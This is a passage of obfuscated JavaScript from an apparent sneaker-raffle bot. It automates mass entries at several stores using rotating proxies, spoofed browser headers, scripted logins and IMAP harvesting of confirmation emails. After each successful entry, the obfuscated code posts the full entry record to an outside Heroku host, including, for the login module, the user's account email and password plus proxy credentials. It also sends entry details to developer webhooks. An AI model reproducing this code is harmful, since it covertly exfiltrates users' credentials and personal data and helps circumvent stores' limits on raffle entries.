                            console['log'](_0x2fd7e7() + '\x20[' + _0x389474['name'] + ']\x20Task\x20' + (_0x3d7f8b + 0x1) + '\x20:\x20Logging\x20in'), await _0x361f79['waitForSelector']('#username'), await _0x361f79['type']('#username', _0x5a3b66[_0x3d7f8b]['Email']), await _0x361f79['waitForSelector']('#password'), await _0x361f79['type']('#password', _0x5a3b66[_0x3d7f8b]['Password']), await _0x41ff52(0x190), await _0x361f79['click']('#buttonSubmit'), await _0x361f79['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x2fd7e7() + '\x20[' + _0x389474['name'] + ']\x20Task\x20' + (_0x3d7f8b + 0x1) + '\x20:\x20Getting\x20Product'), await _0x41ff52(0x1f4), console['log'](_0x2fd7e7() + '\x20[' + _0x389474['name'] + ']\x20Task\x20' + (_0x3d7f8b + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x5a3b66[_0x3d7f8b]['Size']);
                            let _0x3590ee = _0x5a3b66[_0x3d7f8b]['Size']['replace']('.5', '\x201/2');
                            await _0x361f79['click']('button[title=\x22' + _0x3590ee + '\x22]'), await _0x41ff52(0x1f4);
                            try {
                                await _0x361f79['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x41ff52(0x12c), console['log'](_0x2fd7e7() + '\x20[' + _0x389474['name'] + ']\x20Task\x20' + (_0x3d7f8b + 0x1) + '\x20:\x20Filling\x20Information'), await _0x361f79['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x41ff52(0x12c), await _0x361f79['type']('#dwfrm_raffle_addressFields_firstName', _0x5a3b66[_0x3d7f8b]['FirstName']), await _0x41ff52(0x12c), await _0x361f79['type']('#dwfrm_raffle_addressFields_lastName', _0x5a3b66[_0x3d7f8b]['LastName']), await _0x41ff52(0x12c), await _0x361f79['select']('#dwfrm_raffle_addressFields_country', _0x5a3b66[_0x3d7f8b]['Country']), await _0x41ff52(0x12c), await _0x361f79['type']('#dwfrm_raffle_addressFields_city', _0x5a3b66[_0x3d7f8b]['City']), await _0x41ff52(0x12c);
                            _0x5a3b66[_0x3d7f8b]['Postcode'] == undefined && (_0x5a3b66[_0x3d7f8b]['Postcode'] = _0x5a3b66[_0x3d7f8b]['Zip']);
                            await _0x361f79['type']('#dwfrm_raffle_addressFields_postalCode', _0x5a3b66[_0x3d7f8b]['Postcode']), await _0x41ff52(0x12c), await _0x361f79['type']('#dwfrm_raffle_addressFields_address1', _0x5a3b66[_0x3d7f8b]['Address1']), await _0x41ff52(0x12c), await _0x361f79['type']('#dwfrm_raffle_addressFields_address2', _0x5a3b66[_0x3d7f8b]['HouseNumber']), await _0x41ff52(0x12c), await _0x361f79['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x5a3b66[_0x3d7f8b]['Address2']), await _0x41ff52(0x12c), await _0x361f79['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x41ff52(0x12c), await _0x361f79['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x5a3b66[_0x3d7f8b]['Follower']), await _0x41ff52(0x1f4), await _0x361f79['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x41ff52(0x1f4), console['log'](_0x2fd7e7() + '\x20[' + _0x389474['name'] + ']\x20Task\x20' + (_0x3d7f8b + 0x1) + '\x20:\x20' + _0xe8dd24['blue']('Awaiting\x20Paypal\x20Payment')), await _0x361f79['click']('.b-paypal_button');
                            try {
                                await _0x361f79['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0xbbe71a = 'no', _0xe72aef(_0x5a3b66[_0x3d7f8b], _0x389474), console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x389474['name'] + ']\x20Task\x20' + (_0x3d7f8b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x3f6d6d['succesDEVMSG']);
                                await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0x3f6d6d['succesDEVMSG']), await _0x41ff52(0xc8), await _0x161ab9(_0x17a127, _0x3f6d6d['succesPUBMSG']);
                                let _0x2d217b = _0x5a3b66[_0x3d7f8b];
                                try {
                                    prxdata = {
                                        'username': _0x4f2583['replace']('#', ''),
                                        'module': _0x389474['name'],
                                        'entrydata': JSON['stringify'](_0x2d217b),
                                        'proxy': '' + _0x314579[_0x3d7f8b]
                                    };
                                    var _0x50a1ef = JSON['stringify'](prxdata);
                                    let _0x3c0489 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0x50a1ef, _0x3c0489);
                                } catch (_0x125d4e) {
                                }
                            } catch (_0x18b6af) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x389474['name'] + ']\x20Task\x20' + (_0x3d7f8b + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x18b6af)), _0x2679a2 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x18b6af;
                                var _0x10066c = await _0x17c0a2(_0x5a3b66[_0x3d7f8b], _0x389474, 'dev', !![], _0x2679a2);
                                _0x3f6d6d['errorDEV'] = { 'embeds': [_0x10066c] }, _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x3f6d6d['errorDEV']), await _0x161ab9(_0x11ee4c, _0x3f6d6d['errorDEV']);
                            }
                        } catch (_0x454759) {
                            console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x389474['name'] + ']\x20Task\x20' + (_0x3d7f8b + 0x1) + '\x20:\x20' + _0x454759)), _0x2679a2 = '' + _0x454759;
                            var _0x10066c = await _0x17c0a2(_0x5a3b66[_0x3d7f8b], _0x389474, 'dev', !![], _0x2679a2);
                            _0x3f6d6d['errorDEV'] = { 'embeds': [_0x10066c] }, _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x3f6d6d['errorDEV']), await _0x161ab9(_0x11ee4c, _0x3f6d6d['errorDEV']), _0xbbe71a = 'yes';
                        } finally {
                            _0x440305 && _0x440305['close']();
                            if (_0xbbe71a == 'yes' && _0x2e8519 != 0x5) {
                                console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x389474['name'] + ']\x20Task\x20' + (_0x3d7f8b + 0x1) + '\x20:\x20Retrying\x20(' + _0x2e8519 + '\x20/\x205)')), _0x3d7f8b = _0x3d7f8b - 0x1, _0x2e8519 = _0x2e8519 + 0x1;
                                continue;
                            }
                            _0xbbe71a == 'yes' && _0x2e8519 >= 0x5 && (_0x53e25e(_0x5a3b66[_0x3d7f8b], _0x389474), _0xbbe71a = 'no', _0x2e8519 = 0x0), console['log']('Waiting\x20for\x20' + _0x4a0109['AfewDelay'] + '\x20ms'), await _0x41ff52(_0x4a0109['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5481b4, _0x1eebc2, _0x5a1672) {
                    for (var _0x37f0c8 = 0x0; _0x37f0c8 < _0x1eebc2['length']; _0x37f0c8++) {
                        try {
                            await _0x547a29(_0x1eebc2, _0x37f0c8);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x8b305(_0x40be5b, _0x37db7a, _0x581a48, _0x54b7ff, _0x158788) {
                            var _0x2ed03f, _0x51acc7 = {}, _0x28642e = [], _0x2dbd61 = {}, _0x211c77 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x20c26 = Math['round'](Math['random']() * (_0x211c77['length'] - 0x1));
                            !_0x54b7ff && (_0x54b7ff = {});
                            if (_0x37db7a != 'ver') {
                                _0x3a603f(_0x581a48['name'] + '\x20Task\x20' + (_0x40be5b + 0x1) + '\x20/\x20' + _0x54b7ff['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4), await _0x547a29(_0x54b7ff, _0x40be5b), _0x51acc7 = _0x581a48['data'], _0x51acc7['data']['attributes']['email'] = '' + _0x54b7ff[_0x40be5b]['Email'];
                                if (_0x54b7ff[_0x40be5b]['Size'] == 'RANDOM') {
                                }
                                _0x51acc7['data']['attributes']['properties']['$first_name'] = '' + _0x54b7ff[_0x40be5b]['FirstName'], _0x51acc7['data']['attributes']['properties']['$last_name'] = '' + _0x54b7ff[_0x40be5b]['LastName'], _0x51acc7['data']['attributes']['properties']['$address1'] = _0x54b7ff[_0x40be5b]['Address1'] + '\x20' + _0x54b7ff[_0x40be5b]['Address2'] + '\x20' + _0x54b7ff[_0x40be5b]['HouseNumber'], _0x51acc7['data']['attributes']['properties']['$zip'] = '' + _0x54b7ff[_0x40be5b]['Zip'], _0x51acc7['data']['attributes']['properties']['$city'] = '' + _0x54b7ff[_0x40be5b]['City'], _0x51acc7['data']['attributes']['properties']['$country'] = '' + _0x54b7ff[_0x40be5b]['Country'], _0x54b7ff[_0x40be5b]['Size'] == 'RANDOM' ? _0x51acc7['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x211c77[_0x20c26] : _0x51acc7['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x54b7ff[_0x40be5b]['Size'], _0x51acc7['data']['attributes']['properties']['$phone_number'] = '' + _0x54b7ff[_0x40be5b]['Phone'], _0x51acc7['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x54b7ff[_0x40be5b]['Follower'];
                            }
                            if (_0x4a0109['useRandomProxy'] = ![])
                                var _0x570c7a = _0x158788[_0x40be5b]['split'](':');
                            else
                                var _0x389eb4 = Math['round'](Math['random']() * (_0x158788['length'] - 0x1)), _0x570c7a = _0x158788[_0x389eb4]['split'](':');
                            var _0x5da71b = {
                                'jar': _0x500704,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x581a48['url'],
                                'headers': _0x581a48['headers'],
                                'body': JSON['stringify'](_0x51acc7),
                                'proxy': 'http://' + _0x570c7a[0x2] + ':' + _0x570c7a[0x3] + '@' + _0x570c7a[0x0] + ':' + _0x570c7a[0x1]
                            };
                            return _0x37db7a != 'ver' && (_0x5da71b['url'] = _0x581a48['url'], _0x5da71b['headers'] = _0x581a48['headers']), _0x37db7a == 'ver' && (_0x5da71b['method'] = 'GET'), new Promise(function (_0x326d01, _0x5ed642) {
                                callback = async (_0x5a6774, _0x251b74, _0x5c2ad4) => {
                                    if (!_0x5a6774 && _0x251b74['statusCode'] == 0xca || !_0x5a6774 && _0x251b74['statusCode'] == 0xc8) {
                                        if (_0x37db7a != 'ver') {
                                            var _0x1e6228 = await _0x17c0a2(_0x54b7ff[_0x40be5b], _0x581a48, 'dev', ![]), _0x53fd01 = await _0x17c0a2(_0x54b7ff[_0x40be5b], _0x581a48, 'pub', ![]);
                                            const _0xc8197e = {
                                                'succesDEVMSG': { 'embeds': [_0x1e6228] },
                                                'succesPUBMSG': { 'embeds': [_0x53fd01] }
                                            };
                                            let _0x4b070d = _0x54b7ff[_0x40be5b];
                                            try {
                                                prxdata = {
                                                    'username': _0x4f2583['replace']('#', ''),
                                                    'module': _0x581a48['name'],
                                                    'entrydata': JSON['stringify'](_0x4b070d),
                                                    'proxy': '' + _0x158788[_0x40be5b]
                                                };
                                                var _0x15af7a = JSON['stringify'](prxdata);
                                                let _0x517151 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x469c71['post']('https://jraffles.herokuapp.com/success', _0x15af7a, _0x517151);
                                            } catch (_0x39ffe0) {
                                            }
                                            if (_0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '')
                                                try {
                                                    await _0x161ab9(_0x4a0109['webhook'], _0xc8197e['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0xc8197e['succesDEVMSG']), await _0x41ff52(0xc8);
                                            try {
                                                await _0x161ab9(_0x17a127, _0xc8197e['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0xe72aef(_0x54b7ff[_0x40be5b], _0x581a48);
                                        }
                                        _0x326d01(console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x581a48['name'] + ']\x20Task\x20' + (_0x40be5b + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x37db7a != 'ver') {
                                            var _0x36635b = '' + _0x5a6774, _0x42f29f = await _0x17c0a2(_0x54b7ff[_0x40be5b], _0x581a48, 'dev', !![], _0x36635b), _0xee56d8 = {};
                                            _0xee56d8['errorDEV'] = { 'embeds': [_0x42f29f] }, _0x53e25e(_0x54b7ff[_0x40be5b], _0x581a48), _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0xee56d8['errorDEV']), await _0x161ab9(_0x11ee4c, _0xee56d8['errorDEV']);
                                        }
                                        _0x5ed642(console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x581a48['name'] + ']\x20Task\x20' + (_0x40be5b + 0x1) + ':\x20' + _0x5a6774)));
                                    }
                                };
                                try {
                                    _0x37db7a != 'ver' && console['log'](_0x2fd7e7() + '\x20[' + _0x581a48['name'] + ']\x20Task\x20' + (_0x40be5b + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x51acc7['data']['attributes']['email']), _0x11f0d1(_0x5da71b, callback);
                                } catch (_0x4b4653) {
                                    console['log'](_0x2fd7e7() + '\x20Task\x20' + (_0x40be5b + 0x1) + ':\x20' + _0x4b4653);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x8b305(_0x37f0c8, 'nor', _0x5481b4, _0x1eebc2, _0x5a1672), console['log'](_0x2fd7e7() + '\x20[' + _0x5481b4['name'] + ']\x20Sleeping\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                        } catch (_0x23f0e8) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3be194, _0xd2fcfa, _0x4d0b2e) {
                    var _0x1c3989 = [], _0x212c7a = ![];
                    async function _0x5cfec0() {
                        var _0x56697f = new _0x2b7859({
                            'user': _0x4a0109['masterMail'],
                            'password': _0x4a0109['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x52294f(_0xda8c1) {
                            _0x56697f['openBox']('INBOX', ![], _0xda8c1);
                        }
                        _0x56697f['once']('ready', function () {
                            _0x52294f(function (_0x218269, _0x411fc8) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x218269)
                                    throw _0x218269;
                                _0x56697f['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0xfc0f02, _0x3d7755) {
                                    if (!_0x3d7755 || !_0x3d7755['length'])
                                        console['log'](_0x2fd7e7() + '\x20[' + _0x3be194['name'] + ']\x20No\x20mails\x20found'), _0x56697f['end']();
                                    else {
                                        var _0x4283ff = _0x56697f['seq']['fetch'](_0x3d7755, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4283ff['on']('message', function (_0x6a1d24, _0x375a2b) {
                                            var _0x3b6b6d = '(#' + _0x375a2b + ')\x20';
                                            _0x6a1d24['on']('body', function (_0x2eae8a, _0x32b232) {
                                                _0x186dbf(_0x2eae8a, (_0x2a2ea0, _0xdc0ce6) => {
                                                    var _0x414288 = _0xdc0ce6['text']['split']('(')[0x1], _0x5a6c0f = _0x414288['split'](')')[0x0];
                                                    _0x1c3989['push'](_0x5a6c0f);
                                                });
                                            }), _0x6a1d24['once']('end', function () {
                                            });
                                        }), _0x4283ff['once']('error', function (_0x568887) {
                                            console['log']('Fetch\x20error:\x20' + _0x568887), _0x212c7a = !![];
                                        }), _0x4283ff['once']('end', function () {
                                            _0x56697f['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x56697f['once']('error', function (_0xc36e52) {
                            console['log'](_0xe8dd24['red'](_0xc36e52['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x212c7a = !![];
                        }), _0x56697f['once']('end', async function () {
                            _0x212c7a = !![];
                        }), _0x56697f['connect']();
                    }
                    async function _0x5d20a5(_0x36814b, _0x5c1e29, _0x358a54) {
                        for (var _0xc821fc = 0x0; _0xc821fc < _0x5c1e29['length']; _0xc821fc++) {
                            async function _0x43aceb(_0x3b3c4a, _0x4d5027, _0x18eafe, _0x1e081c, _0x3bc80b) {
                                var _0x562ff4, _0x1f2bb8 = {}, _0x129bc3 = [], _0x519c44 = {}, _0x4d7383 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x538b8f = Math['round'](Math['random']() * (_0x4d7383['length'] - 0x1));
                                _0x1e081c[_0x3b3c4a]['Size'] == 'RANDOM' && (_0x1e081c[_0x3b3c4a]['Size'] = _0x4d7383[_0x538b8f]);
                                !_0x1e081c && (_0x1e081c = {});
                                if (_0x4a0109['useRandomProxy'] = ![])
                                    var _0xb1cf6c = _0x3bc80b[_0x3b3c4a]['split'](':');
                                else
                                    var _0x589dc0 = Math['round'](Math['random']() * (_0x3bc80b['length'] - 0x1)), _0xb1cf6c = _0x3bc80b[_0x589dc0]['split'](':');
                                var _0x449c61 = {
                                    'jar': _0x500704,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x18eafe['url'],
                                    'headers': _0x18eafe['headers'],
                                    'body': JSON['stringify'](_0x1f2bb8),
                                    'proxy': 'http://' + _0xb1cf6c[0x2] + ':' + _0xb1cf6c[0x3] + '@' + _0xb1cf6c[0x0] + ':' + _0xb1cf6c[0x1]
                                };
                                return _0x4d5027 != 'ver' && (_0x449c61['url'] = _0x18eafe['url'], _0x449c61['headers'] = _0x18eafe['headers']), _0x4d5027 == 'ver' && (_0x449c61['method'] = 'GET', _0x449c61['url'] = _0x1e081c[_0x3b3c4a]), new Promise(function (_0x4fd36d, _0x1ec3dd) {
                                    callback = async (_0x3dd54d, _0x5c8349, _0x535b86) => {
                                        if (!_0x3dd54d && _0x5c8349['statusCode'] == 0xca || !_0x3dd54d && _0x5c8349['statusCode'] == 0xc8) {
                                            if (_0x4d5027 != 'ver') {
                                                var _0x207aff = await _0x17c0a2(_0x1e081c[_0x3b3c4a], _0x18eafe, 'dev', ![]), _0x205b80 = await _0x17c0a2(_0x1e081c[_0x3b3c4a], _0x18eafe, 'pub', ![]);
                                                const _0x3b795e = {
                                                    'succesDEVMSG': { 'embeds': [_0x207aff] },
                                                    'succesPUBMSG': { 'embeds': [_0x205b80] }
                                                };
                                                if (_0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '')
                                                    try {
                                                        await _0x161ab9(_0x4a0109['webhook'], _0x3b795e['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x41ff52(0xc8), await _0x161ab9(_0x6ed44c, _0x3b795e['succesDEVMSG']), await _0x41ff52(0xc8);
                                                try {
                                                    await _0x161ab9(_0x17a127, _0x3b795e['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xe72aef(_0x1e081c[_0x3b3c4a], _0x18eafe);
                                            }
                                            _0x4fd36d(console['log'](_0xe8dd24['green'](_0x2fd7e7() + '\x20[' + _0x18eafe['name'] + ']\x20Task\x20' + (_0x3b3c4a + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x4d5027 != 'ver') {
                                                var _0x38aec0 = '' + _0x3dd54d, _0x2c5065 = await _0x17c0a2(_0x1e081c[_0x3b3c4a], _0x18eafe, 'dev', !![], _0x38aec0), _0x291674 = {};
                                                _0x291674['errorDEV'] = { 'embeds': [_0x2c5065] }, _0x53e25e(_0x1e081c[_0x3b3c4a], _0x18eafe), _0x4a0109['webhook'] != undefined && _0x4a0109['webhook'] != '' && await _0x161ab9(_0x4a0109['webhook'], _0x291674['errorDEV']), await _0x161ab9(_0x11ee4c, _0x291674['errorDEV']);
                                            }
                                            _0x1ec3dd(console['log'](_0xe8dd24['red'](_0x2fd7e7() + '\x20[' + _0x18eafe['name'] + ']\x20Task\x20' + (_0x3b3c4a + 0x1) + ':\x20' + _0x3dd54d)));
                                        }
                                    };
                                    try {
                                        _0x4d5027 != 'ver' ? console['log'](_0x2fd7e7() + '\x20[' + _0x18eafe['name'] + ']\x20Task\x20' + (_0x3b3c4a + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1f2bb8['data']['attributes']['email']) : console['log'](_0x2fd7e7() + '\x20[' + _0x18eafe['name'] + ']\x20Task\x20' + (_0x3b3c4a + 0x1) + ':\x20Fetching\x20Response'), _0x11f0d1(_0x449c61, callback);
                                    } catch (_0x3eee44) {
                                        console['log'](_0x2fd7e7() + '\x20Task\x20' + (_0x3b3c4a + 0x1) + ':\x20' + _0x3eee44);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x43aceb(_0xc821fc, 'ver', _0x36814b, _0x5c1e29, _0x358a54), console['log'](_0x2fd7e7() + '\x20[' + _0x36814b['name'] + ']\x20Sleeping\x20for\x20' + _0x4a0109['delay'] + '\x20ms'), await _0x41ff52(_0x4a0109['delay']);
                            } catch (_0x380a5c) {
                            }
                        }
                    }
                    try {
                        _0x5cfec0();
                        while (!_0x212c7a) {
                            await _0x41ff52(0xbb8);
                        }
                        console['log']('Found\x20' + _0x1c3989['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x41ff52(0x9c4);
                    }
                    await _0x5d20a5(_0x3be194, _0x1c3989, _0x4d0b2e);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'X4md8Z',
                            'custom_source': 'DZ4137-106',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WspqGE',
                                '$consent_form_version': 0x89a2a4,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1d42b0, _0x375424, _0x3d4004) {
                    for (var _0x5b103e = 0x0; _0x5b103e < _0x375424['length']; _0x5b103e++) {
                        try {
                            await _0x547a29(_0x375424, _0x5b103e);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x430eb9(_0x401f46, _0x21069b, _0x58bc4d, _0x1519c6, _0x356802) {
                            var _0x5a8436, _0x7c9d47 = {}, _0x190413 = [], _0x59b154 = {}, _0x74b9a2 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x1cf09b = Math['round'](Math['random']() * (_0x74b9a2['length'] - 0x1));
                            !_0x1519c6 && (_0x1519c6 = {});
                            if (_0x21069b != 'ver') {
                                _0x3a603f(_0x58bc4d['name'] + '\x20Task\x20' + (_0x401f46 + 0x1) + '\x20/\x20' + _0x1519c6['length'] + '\x20||\x20File:\x20' + _0x140e27 + '\x20Proxies:\x20' + _0x6deda4), _0x190413 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x4f2583
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x1519c6[_0x401f46]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x4a0109['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x5192c8
                                        }
                                    ]
                                }], _0x59b154 = { 'embeds': _0x190413 }, _0x7c9d47 = _0x58bc4d['data'], _0x7c9d47['data']['attributes']['email'] = '' + _0x1519c6[_0x401f46]['Email'];
                                if (_0x1519c6[_0x401f46]['Size'] == 'RANDOM') {
                                }
